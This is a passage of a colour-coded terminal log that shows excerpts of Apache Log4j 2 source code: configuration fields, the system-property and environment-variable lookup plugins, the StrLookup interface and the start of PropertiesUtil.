[2;36m                    [0m         [39mwas[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m840[0m[39m:                                                        [0m[35m/[0m[35m/[0m[39m altered[0m              [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/BaseConfiguration.jav[0m[1;92ma:46[0m[39m-[0m[1;36m1[0m [2m                [0m
[2;36m                    [0m         [1;36m00[0m                                                                                  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginValue;[0m                 [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:import org.apache.logging.log4j.core.filter.AbstractFilterable;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:import org.apache.logging.log4j.core.helpers.Constants;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:import org.apache.logging.log4j.core.helpers.NameUtil;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:import org.apache.logging.log4j.core.layout.PatternLayout;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:import org.apache.logging.log4j.core.lookup.Interpolator;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:import org.apache.logging.log4j.core.lookup.MapLookup;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:import org.apache.logging.log4j.core.lookup.StrLookup;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:import org.apache.logging.log4j.core.lookup.StrSubstitutor;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:import org.apache.logging.log4j.core.net.Advertiser;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:import org.apache.logging.log4j.util.PropertiesUtil;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m: * The Base Configuration. Many configuration implementations will extend this [0m  [2m                [0m
[2;36m                    [0m         [39mclass.[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:public class BaseConfiguration extends AbstractFilterable implements [0m            [2m                [0m
[2;36m                    [0m         [39mConfiguration [0m[1;39m{[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:     * Allow subclasses access to the status logger without creating another [0m    [2m                [0m
[2;36m                    [0m         [39minstance.[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    protected static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * The root node of the configuration.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:    protected Node rootNode;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     * Listeners for configuration changes.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:    protected final List<ConfigurationListener> listeners =[0m                      [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:        new CopyOnWriteArrayList<ConfigurationListener>[0m[1;39m([0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     * The ConfigurationMonitor that checks for configuration changes.[0m           [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    protected ConfigurationMonitor monitor = new [0m[1;35mDefaultConfigurationMonitor[0m[1;39m([0m[1;39m)[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:     * The Advertiser which exposes appender configurations to external systems.[0m [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    protected Advertiser advertiser = new [0m[1;35mDefaultAdvertiser[0m[1;39m([0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:    private String name;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:    private ConcurrentMap<String, Appender<?>> appenders = new [0m                  [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, Appender<?>>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:    private ConcurrentMap<String, LoggerConfig> loggers = new [0m                   [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, LoggerConfig>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:    private final StrLookup tempLookup = new [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:    private final StrSubstitutor subst = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mtempLookup[0m[1;39m)[0m[39m;[0m         [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    private LoggerConfig root = new [0m[1;35mLoggerConfig[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/SystemPropertiesLookup.jav[0m[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:25[0m[39m-[0m[1;36m56[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"sys"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:public class SystemPropertiesLookup implements StrLookup [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:     * Lookup the value for the key.[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * @return The value for the key.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:            return [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * Lookup the value for the key using the data in the LogEvent.[0m              [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * @param event The current LogEvent.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * @return The value associated with the key.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:            return [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/EnvironmentLookup.jav[0m[1;92ma:25[0m[39m-[0m[1;36m4[0m [2m                [0m
[2;36m                    [0m         [1;36m8[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"env"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:public class EnvironmentLookup implements StrLookup [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        return [0m[1;35mSystem.getenv[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        return [0m[1;35mSystem.getenv[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m87[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m: * Lookup a String key to a String value.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m: * This class represents the simplest form of a string to string map.[0m            [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m: * It has a benefit over a map in that it can create the result on[0m               [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * demand based on the key.[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m: * This class comes complete with various factory methods.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m: * If these do not suffice, you can subclass and implement your own matcher.[0m     [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m: * For example, it would be possible to implement a lookup that used the[0m         [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m: * key as a primary key, and looked up the value on demand from the database[0m     [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m: * @version $Id$[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:public interface StrLookup [0m[1;39m{[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * Looks up a String key to a String value.[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * The internal implementation may use any mechanism to return the value.[0m    [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * The simplest implementation is to use a Map. However, virtually any[0m       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * implementation is possible.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * For example, it would be possible to implement a lookup that used the[0m     [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * key as a primary key, and looked up the value on demand from the database[0m [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * Or, a numeric based implementation could be created that treats the key[0m   [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * as an integer, increments the value and return the result as a string -[0m   [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * converting [0m[1;36m1[0m[39m to [0m[1;36m2[0m[39m, [0m[1;36m15[0m[39m to [0m[1;36m16[0m[39m etc.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * The [0m[1;39m{[0m[39m@link #[0m[1;35mlookup[0m[1;39m([0m[39mString[0m[1;39m)[0m[1;39m}[0m[39m method always returns a String, regardless of[0m [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     * the underlying data, by converting it as necessary. For example:[0m          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * <pre>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:     * Map<String, Object> map = new HashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * [0m[1;35mmap.put[0m[1;39m([0m[32m"number"[0m[39m, new [0m[1;35mInteger[0m[1;39m([0m[1;36m2[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     * [0m[1;35massertEquals[0m[1;39m([0m[32m"2"[0m[39m, [0m[1;35mStrLookup.mapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;35m.lookup[0m[1;39m([0m[32m"number"[0m[1;39m)[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:     * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * @return the matching value, null if no match[0m                              [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    String [0m[1;35mlookup[0m[1;39m([0m[39mString key[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:     * Looks up a String key to a String value possibly using the current [0m       [2m                [0m
[2;36m                    [0m         [39mLogEvent.[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:     * The internal implementation may use any mechanism to return the value.[0m    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:     * The simplest implementation is to use a Map. However, virtually any[0m       [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * implementation is possible.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * For example, it would be possible to implement a lookup that used the[0m     [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * key as a primary key, and looked up the value on demand from the database[0m [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * Or, a numeric based implementation could be created that treats the key[0m   [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     * as an integer, increments the value and return the result as a string -[0m   [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:     * converting [0m[1;36m1[0m[39m to [0m[1;36m2[0m[39m, [0m[1;36m15[0m[39m to [0m[1;36m16[0m[39m etc.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:     * The [0m[1;39m{[0m[39m@link #[0m[1;35mlookup[0m[1;39m([0m[39mString[0m[1;39m)[0m[1;39m}[0m[39m method always returns a String, regardless of[0m [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:     * the underlying data, by converting it as necessary. For example:[0m          [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:     * <pre>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:     * Map<String, Object> map = new HashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:     * [0m[1;35mmap.put[0m[1;39m([0m[32m"number"[0m[39m, new [0m[1;35mInteger[0m[1;39m([0m[1;36m2[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     * [0m[1;35massertEquals[0m[1;39m([0m[32m"2"[0m[39m, [0m[1;35mStrLookup.mapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;35m.lookup[0m[1;39m([0m[32m"number"[0m[1;39m)[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:     * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:     * @param event The current LogEvent.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:     * @return the matching value, null if no match[0m                              [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:    String [0m[1;35mlookup[0m[1;39m([0m[39mLogEvent event, String key[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:28[0m[39m-[0m[1;36m140[0m          [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:public class PropertiesUtil [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:    private static final PropertiesUtil LOG4J_PROPERTIES = new [0m                  [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil[0m[1;39m([0m[32m"log4j2.component.properties"[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private final Properties props;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal Properties props[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        this.props = props;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal String propsLocn[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:        this.props = new [0m[1;35mProperties[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:        final ClassLoader loader = [0m[1;35mProviderUtil.findClassLoader[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        final InputStream in = [0m[1;35mloader.getResourceAsStream[0m[1;39m([0m[39mpropsLocn[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        if [0m[1;39m([0m[39mnull != in[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:                [0m[1;35mthis.props.load[0m[1;39m([0m[39min[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:                [0m[35m/[0m[35m/[0m[39m ignored[0m                                                       [2m                [0m
